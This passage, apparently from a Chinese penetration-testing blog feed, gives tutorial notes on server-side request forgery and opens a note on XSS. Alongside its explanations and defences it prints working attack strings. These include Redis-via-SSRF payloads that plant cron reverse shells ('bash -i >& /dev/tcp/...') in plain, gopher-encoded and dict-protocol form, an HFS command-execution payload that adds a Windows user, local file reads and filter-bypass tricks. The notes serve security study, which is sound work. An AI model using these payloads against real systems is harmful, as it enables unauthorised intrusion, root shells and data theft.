title="&#x3D;&#x3D;SSRF&#x3D;&#x3D;（更重要）"></a>&#x3D;&#x3D;SSRF&#x3D;&#x3D;（更重要）</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>SSRF(Server-Side Request Forgery：<strong>服务器端请求伪造</strong>) 是一种由攻击者构造形成<u>由服务端发起请求</u>的一个安全漏洞。攻击者向服务器上传恶意地址，服务器未对地址进行检查就直接访问，让目标服务器执行非本意的操作，造成了攻击。</p><p><strong>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</strong>正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。SSRF常被用于，探测攻击者无法访问到的网络区域，比如服务器所在的内网，或是受防火墙访问的主机。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1628818773345-5dee00af-4c10-4952-a572-61b413c1b5ac.png" alt="img"></p><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>SSRF的形成<strong>大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制</strong>。比如没有限制可以构建恶意访问的敏感协议头或内网访问资源权限。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</p><h2 id="SSRF与CSRF的区别？"><a href="#SSRF与CSRF的区别？" class="headerlink" title="SSRF与CSRF的区别？"></a>SSRF与CSRF的区别？</h2><p>1.SSRF是服务端请求伪造，SSRF是诱导服务器访问，欺骗的是服务端（服务器）</p><p>2.CSRF是跨站请求伪造，CSRF是通过诱导用户点击，欺骗的是客户端（浏览器）</p><h2 id="SSRF的挖掘"><a href="#SSRF的挖掘" class="headerlink" title="SSRF的挖掘"></a>SSRF的挖掘</h2><h3 id="从web功能出发："><a href="#从web功能出发：" class="headerlink" title="从web功能出发："></a>从web功能出发：</h3><ul><li><p>URL分享：通过URL地址分享网页内容</p></li><li><p>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p></li><li><p>在线翻译（有道翻译ssrf漏洞）：通过URL地址翻译对应文本的内容</p></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803192304757.png" alt="image-20220803192304757"></p><ul><li><p>图片加载与下载（通过URL地址加载或下载图片）：通过URL地址加载或下载图片，比如上传头像</p></li><li><p>图片、文章收藏功能</p></li><li><p>网站采集、网页抓取的地方</p></li><li><p>一切要你输入网址的地方和可以输入ip的地方。</p></li></ul><h3 id="从URL关键字中寻找："><a href="#从URL关键字中寻找：" class="headerlink" title="从URL关键字中寻找："></a>从URL关键字中寻找：</h3><p>share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain</p><h2 id="SSRF的验证"><a href="#SSRF的验证" class="headerlink" title="SSRF的验证"></a>SSRF的验证</h2><p>SSRF漏洞特点：一般通过构造URL来判断该网站是否存在SSRF</p><ol><li><p><strong>白盒测试</strong></p><p>寻找可能构成SSRF漏洞的危险函数：file_get_contents()、fsockopen()、curl_exec()。</p></li><li><p><strong>黑盒测试</strong></p><p>（1）右键图片，看图片（或者其他资源）的URL是否为该网站的路径。如果该图片是其他服务器的地址，则可能存在SSRF漏洞。</p><p>（2）burpsuite抓包，查看网站请求消息报文中是否存在URL，URL请求的是否为内网IP。然后也可以尝试将URL更换为可能的内网地址（通过历史漏洞判断该web应用可能的内网地址），或者暴力拆解内网地址。</p><p>（3）DNS外带（<strong>常用于测试没有回显的网站</strong>）DNSlog平台测试（查询DNS解析过程）</p></li></ol><ul><li><p>排除法：浏览器f12查看源代码看是否是在本地进行了请求</p><p>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p></li><li><p>dnslog等工具进行测试，看是否被访问</p><p>可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。</p></li><li><p>抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址</p><p>从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p><p>通过二级域名暴力猜解工具模糊猜测内网地址</p></li><li><p>直接返回的Banner、title、content等信息</p></li><li><p>留意bool型SSRF</p></li></ul><h2 id="漏洞利用（危害可大可小）"><a href="#漏洞利用（危害可大可小）" class="headerlink" title="漏洞利用（危害可大可小）"></a>漏洞利用（危害可大可小）</h2><ul><li><p><strong>内网探测</strong>：可以对外网、内网、本地进行端口扫描，某些情况下端口的Banner会回显出来（比如3306的）；</p><p>比如输入<code>http://192.168.64.144:3306</code>进行探测。</p></li><li><p><strong>攻击运行在内网或外网的有漏洞程序</strong>（比如溢出）；</p><p>向内部任意主机的任意端口发送精心构造的payload，主要是使用 GET 参数就可以实现的攻击（如Struts2漏洞，SQL注入）；</p></li><li><p>可以对内网Web应用进行指纹识别，原理是通过请求默认的文件得到特定的指纹（如readme文件）；</p></li><li><p><strong>窃取本地和内网敏感数据</strong>：使用<code>file://</code>协议读取本地文件(或其他协议）</p><p><strong>各个协议调用探针: http, file, dict, ftp, gopher等</strong></p><p><strong>漏洞攻击：端口扫描，指纹识别，漏洞利用，内网探针等</strong></p><p>探测内网主机：<code>http://192.168.64.144/phpmyadmin/</code></p><p>**探测服务器文件<code>file:///</code>**：<code>file:///c:/windows/win.ini</code>，在有回显的情况下，利用 file 协议可以读取任意内容</p><p><strong>探测内网服务（dict伪协议）web服务</strong>：<code>dict://192.168.64.144:3306/info</code>，会泄露安装软件版本信息，查看端口，操作内网<strong>redis</strong>服务等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dict://127.0.0.1:3360（探测 MySQL 服务）</span><br><span class="line">如果内网中的mysql数据库存在无密码的用户，可结合gopher协议进行攻击。</span><br><span class="line"></span><br><span class="line">dict://127.0.0.1:22（探测 SSH 服务）</span><br><span class="line">dict://127.0.0.1:6379（探测 redis 服务）</span><br><span class="line">dict://127.0.0.1:1433（探测 SQL server 服务）</span><br></pre></td></tr></table></figure><p>探测内网主机的ftp是否开启：<code>ftp://192.168.64.144:21</code></p><p><strong>gopher伪协议</strong> 支持发出GET、POST请求，发送TCP数据，默认端口70</p><p>可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。</p><p>gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）。可用于反弹shell。所有的WEB服务中间件都支持gopher协议，gopher可以发送任何的TCP数据包，常用于攻击redis服务（内存数据库——拿到该服务即是最高权限）。</p><p><strong>gopher</strong> 的利用可以参考：<a href="http://t.zoukankan.com/beidaxmf-p-13935298.html%E3%80%81https://blog.csdn.net/qq_60115503/article/details/124407499%E3%80%82">http://t.zoukankan.com/beidaxmf-p-13935298.html、https://blog.csdn.net/qq_60115503/article/details/124407499。</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">利用gopher发起请求的一般步骤：</span><br><span class="line">1.构造HTTP的请求消息</span><br><span class="line">2.对请求消息进行URL编码</span><br><span class="line">3.对编码后的%0a替换成%0D%0a</span><br><span class="line">4.将替换后的数据再进行一次URL编码（双重URL编码）</span><br><span class="line">5.拼接协议头</span><br></pre></td></tr></table></figure><p><strong>各个脚本语言所支持的协议：</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803190312037.png" alt="image-20220803190312037"></p></li><li><p><strong>作为下一步攻击的跳板</strong></p><p>比如使用ssrf探测内网主机，探查到有一台主机开放了8080端口：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803191051676.png" alt="image-20220803191051676"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803191132436.png" alt="image-20220803191132436"></p><p>发现该主机搭载了HFS。搜索HFS相关漏洞，发现<a href="https://blog.csdn.net/qq_45884775/article/details/124065484%EF%BC%8C%E5%AD%98%E5%9C%A8RCE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E3%80%82payload%E4%B8%BA%60http://127.0.0.1:8080/?search==%00%7B.exec%7Ccmd.exe">https://blog.csdn.net/qq_45884775/article/details/124065484，存在RCE命令执行漏洞。payload为`http://127.0.0.1:8080/?search==%00{.exec|cmd.exe</a> &#x2F;c [Command-String].}&#96;。</p><p>所以可以实施攻击，比如<code>http://192.168.64.144:8080/?search==%00&#123;.exec|cmd.exe /c net user test1234 1234 /add.&#125;</code>添加用户。或者下载远程文件（下载木马），实施远控。</p></li><li><p><strong>绕过安全防御</strong>：比如防火墙、CDN</p></li></ul><h2 id="SSRF-getshell"><a href="#SSRF-getshell" class="headerlink" title="SSRF getshell"></a>SSRF getshell</h2><h3 id="利用Redis未授权访问getshell"><a href="#利用Redis未授权访问getshell" class="headerlink" title="利用Redis未授权访问getshell"></a>利用Redis未授权访问getshell</h3><p><a href="https://blog.csdn.net/weixin_39194641/article/details/102605354">https://blog.csdn.net/weixin_39194641/article/details/102605354</a></p><p><a href="https://blog.csdn.net/u012206617/article/details/108941738">https://blog.csdn.net/u012206617/article/details/108941738</a></p><p>利用redis写入定时反弹shell任务，用到了CRLF漏洞，url如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">编码前：</span><br><span class="line">http://192.168.31.78:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business location&amp;btnSubmit=Search&amp;operator=http://192.168.221.134:54675/</span><br><span class="line"></span><br><span class="line">set x &quot;\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.221.129/55555 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">aaa</span><br><span class="line">编码后：</span><br><span class="line">http://192.168.221.134:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://192.168.221.134:54675/%0D%0A%0D%0Aset%20x%20%22%5cn*%2f1+*+*+*+*+bash+-i+%3e%26+%2fdev%2ftcp%2f192.168.221.129%2f55555+0%3e%261%5cn%22%0D%0Aconfig%20set%20dir%20%2Fvar%2Fspool%2Fcron%2F%0D%0Aconfig%20set%20dbfilename%20root%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure><p>本机监听并发送payload如下：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220926164339964.png" alt="image-20220926164339964"></p><p>netcat监听，得到了root权限的shell：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220926164442899.png" alt="image-20220926164442899"></p><h3 id="通过curl命令和gopher协议远程攻击内网redis"><a href="#通过curl命令和gopher协议远程攻击内网redis" class="headerlink" title="通过curl命令和gopher协议远程攻击内网redis"></a>通过curl命令和gopher协议远程攻击内网redis</h3><p>使用gopher协议可以用来发送各种格式的请求包。</p><p>gopher协议可配合linux下的curl命令伪造POST请求包发给内网主机。</p><p>此种方法能攻击成功的前提条件是：redis是以root权限运行的。</p><p>payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -v &#x27;http://xxx.xxx.xx.xx/xx.php?url=</span><br><span class="line">gopher://172.21.0.2:6379/</span><br><span class="line">_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f192.168.220.140%2f2333%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#x27;</span><br></pre></td></tr></table></figure><p>redis命令进行了两次url编码，这里是通过gopher协议伪造的请求包用curl命令来发送；</p><p>payload采用的是bash反弹，定时程序路径是&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p><p>发送请求之前在公网机192.168.220.140开启nc监听端口2333</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333 （或nc -l 2333）</span><br></pre></td></tr></table></figure><h3 id="使用dict协议向Redis数据库写shell"><a href="#使用dict协议向Redis数据库写shell" class="headerlink" title="使用dict协议向Redis数据库写shell"></a>使用dict协议向Redis数据库写shell</h3><p>curl扩展也支持dict协议，可以配合curl命令发送请求，但也可以直接在浏览器上或者bp发包请求。</p><p>可通过以下三条命令看是否能利用dict：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/xx.php?url=dict://172.21.0.2:6379/info</span><br><span class="line">/xx.php?url=dict://172.21.0.2:6379/get:user</span><br><span class="line">/xx.php?url=dict://172.21.0.2:6379/flushall</span><br></pre></td></tr></table></figure><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 清除数据</span><br><span class="line">http://xxx.xxx.xx.xx/xx.php?url=dict://172.21.0.2:6379/flushall</span><br><span class="line">// 利用302跳转写入反弹命令</span><br><span class="line">http://xxx.xxx.xx.xx/xx.php?url=dict://172.21.0.2:6379/bhost=*.*.*.*%26bport=1234</span><br><span class="line">// 设置导出路径</span><br><span class="line">http://xxx.xxx.xx.xx/xx.php?url=dict://172.21.0.2:6379/config:set:dir:/var/spool/cron/</span><br><span class="line">// 设置导出名字</span><br><span class="line">http://xxx.xxx.xx.xx/xx.php?url=dict://172.21.0.2:6379/config:set:dbfilename:root</span><br><span class="line">// 导出</span><br><span class="line">http://xxx.xxx.xx.xx/xx.php?url=dict://172.21.0.2:6379/save</span><br></pre></td></tr></table></figure><p>在公网机上使用nc持续监听1234端口，等一会儿把包发完就会反弹shell。</p><h2 id="SSRF漏洞相关函数和协议"><a href="#SSRF漏洞相关函数和协议" class="headerlink" title="SSRF漏洞相关函数和协议"></a>SSRF漏洞相关函数和协议</h2><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p><code>file_get_content</code>函数<strong>从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户</strong>。file_put_content函数把一个字符串写入文件中。支持<code>php://input</code>协议。<code>file_get_contents</code>的gopher协议不能URL编码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>比如，如下页面是通过file参数获得的URL链接请求得到的：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803171228324.png" alt="image-20220803171228324"></p><p>那么此处可以尝试将URL更换为恶意构造的URL，来达到SSRF攻击的目的。</p><p>比如访问服务器本地的readme文件：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803171413493.png" alt="image-20220803171413493"></p><p>甚至是通过本地文件传输协议<code>file://</code>来访问服务器的指定文件：</p><p><img src="/posts/Users/cbcao/AppData/Roaming/Typora/typora-user-images/image-20220803171507586.png" alt="image-20220803171507586"></p><p>利用ssrf测试3306端口：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803172447298.png" alt="image-20220803172447298"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803172514434.png" alt="image-20220803172514434"></p><h3 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h3><p><code>fsockopen</code>函数实现<strong>对用户指定url数据的获取</strong>，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);    <span class="comment">// 打开socket连接</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>;   <span class="comment">// 以get请求获取目标数据</span></span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h3><p><code>curl_exec</code>函数用于<strong>执行指定的CURL会话</strong>，默认不跟踪跳转。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();<span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>); <span class="comment">// CURLOPT_URL: 这是你想用PHP取回的URL地址。你也可以在用curl_init()函数初始化时设置这个选项</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);<span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);<span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SSRF常见种类"><a href="#SSRF常见种类" class="headerlink" title="SSRF常见种类"></a>SSRF常见种类</h2><ul><li><p><strong>远程下载SSRF</strong>：可以直接操纵服务器远程下载其他服务器的资源，这种可以完全回显所有信息，危害最大。</p></li><li><p><strong>布尔型SSRF</strong>：不会回显被攻击的内网信息，是提示true和false，这种对攻击者提供的信息较少，一般只能探测和盲打，利用率不高。</p></li><li><p><strong>无回显SSRF</strong>：不回显任何信息的SSRF。只能通过dnslog判断ssrf是否存在，<u>无法用来探测内网</u>，只能配合其他信息泄露来盲打内网。<u>单独存在没有危害</u>。</p></li></ul><h2 id="SSRF漏洞-防御-amp-绕过姿势"><a href="#SSRF漏洞-防御-amp-绕过姿势" class="headerlink" title="SSRF漏洞(防御&amp;绕过姿势)"></a>SSRF漏洞(防御&amp;绕过姿势)</h2><p><strong>常见防御方法</strong>：</p><ol><li>设置<strong>协议头的白名单</strong>或黑名单，过滤除了HTTP和HTTPS之外的所有协议头</li><li>设置<strong>URL的白名单</strong>或黑名单（比如百度翻译：不允许访问DNSlog和bbc）</li><li>设置访问IP的白名单或黑名单，过滤访问的IP（看需求）</li><li>限制请求的端口为http的常用端口，比如：80、443、8080等</li><li>后台代码对请求来源进行验证</li><li>统一错误信息，避免用户根据错误信息来判断远程服务器的端口状态</li></ol><p><strong>绕过方法：</strong></p><p>参考：<a href="https://www.t00ls.com/articles-41070.html">https://www.t00ls.com/articles-41070.html</a></p><ul><li><p><strong>@</strong></p><p><code>http://abc@127.0.0.1</code> 实际上是以用户名abc连接到站点127.0.0.1。</p><p>在对@解析域名中，不同的处理函数存在处理差异，如：对于<code>http://www.aaa.com@www.bbb.com@www.ccc.com</code>，PHP的<code>parse_url</code>会识别为<code>www.ccc.com</code>，而<code>libcurl</code>则会识别为<code>www.bbb.com</code>。</p></li><li><p><strong>利用[::]</strong></p><p>可以利用<code>[::]</code>来绕过localhost。比如<code>http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</code></p></li><li><p>句号</p><p><code>127。0。0。1  &gt;&gt;&gt;  127.0.0.1</code></p></li><li><p><strong>添加端口号</strong></p><p>比如：<code>http://127.0.0.1:8080</code>。</p></li></ul><p>禁止302跳转，或每次跳转，都检查新的Host是否是内网IP，直到抵达最后的网址。</p><p>绕过：</p><ul><li><p><strong>短网址绕过</strong></p><p>站长工具短网址：<a href="http://tool.chinaz.com/tools/dwz.aspx">http://tool.chinaz.com/tools/dwz.aspx</a> </p><p>百度短网址：<a href="http://dwz.cn/">http://dwz.cn/</a></p></li><li><p><strong>利用特殊域名<code>xip.io</code></strong></p><p>原理是DNS解析。<code>xip.io</code>可以指向任意域名，即<code>127.0.0.1.xip.io</code>，可解析为<code>127.0.0.1</code>。</p></li><li><p><strong>IP限制绕过</strong></p><p>十进制转换 八进制转换 十六进制转换 不同进制组合转换</p><p>127.0.0.1 八进制：0177.0.0.1 十六进制：0x7f.0.0.1 十进制：2130706433</p></li><li><p><strong>协议限制绕过</strong></p><p>禁用不需要的协议(如：<code>file:///</code>、<code>gopher://</code>,<code>dict://</code>等)。仅仅允许http和https请求。</p><p>当url协议限定只为http(s)时，可以利用follow redirect 特性构造302跳转服务，使用<code>https://tinyurl.com</code>生成302跳转地址，再结合<code>dict://</code> <code>file://</code> <code>gopher://</code>构造攻击。</p></li><li><p><strong>DNS重绑定</strong>可以利用于ssrf绕过 ，bypass 同源策略等，，，这里介绍三种方法</p><ol><li>特定域名实现TTL&#x3D;0</li><li>域名绑定两条A记录</li><li>自建DNS服务器</li></ol></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CSRF&quot;&gt;&lt;a href=&quot;#CSRF&quot; class=&quot;headerlink&quot; title=&quot;CSRF&quot;&gt;&lt;/a&gt;CSRF&lt;/h1&gt;&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>XSS</title>
    <link href="https://frankcao3.github.io/posts/7933"/>
    <id>https://frankcao3.github.io/posts/7933</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.979Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1628132918301-6d92440b-aa98-4275-a9bf-b7f7658b568a.png?x-oss-process=image/resize,w_908/resize,w_750,limit_0" alt="img"></p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>XSS 攻击全称跨站脚本攻击Cross Site Scripting。是指用户<u>在 Web 页面中提交恶意脚本，从而使浏览包含恶意脚本的页面的用户在不知情的情况下执行该脚本</u>，导致被攻击的行为。通常出现在<u>搜索框、留言板、评论区</u>等地方。</p><p>与 SQL 注入类似，XSS 也是利用提交恶意信息来实现攻击效果的攻击行为。但是 <u>XSS 一般提交的是 Javascript 脚本</u>，<u><strong>运行在 Web 前端</strong></u>，也就是用户的浏览器；而 SQL 注入提交的 SQL 指令是在后台数据库服务器执行。所以两者攻击的对象是不一样的。</p><p><strong>攻击流程如下：</strong></p><ul><li>攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）。</li><li>诱使受害者打开受到攻击的服务器URL。</li><li>受害者在Web浏览器中打开URL，恶意脚本执行。</li></ul><p><strong>本质</strong>：前端对于用户提交的参数没有审查就用于页面加载；</p><p><strong>产生层面</strong>：前端，浏览器；攻击目标是通过前端脚本获取用户的数据。</p><p><strong>XSS常用的函数类</strong>：输出类：echo printf print print_r sprintf die var-dump var_export</p><p><strong>攻击成功与否受浏览器内核影响</strong>。一些高版本浏览器内核会主动过滤恶意脚本，阻止XSS攻击。</p><p>通常，在XSS攻击中，攻击者会通过邮件或其他方式诱使用户点击包含恶意代码的链接，例如攻击者通过E-mail向用户发送一个包含恶意代码的网站home.com，用户点击链接后，浏览器会在用户毫不知情的情况下执行链接中包含的恶意代码，将用户与home.com交互的Cookie和Session等信息发送给攻击者，攻击者拿到这些数据之后，就会伪装成用户与真正的网站进行会话，从事非法活动，其过程如下图所示。</p><p><img 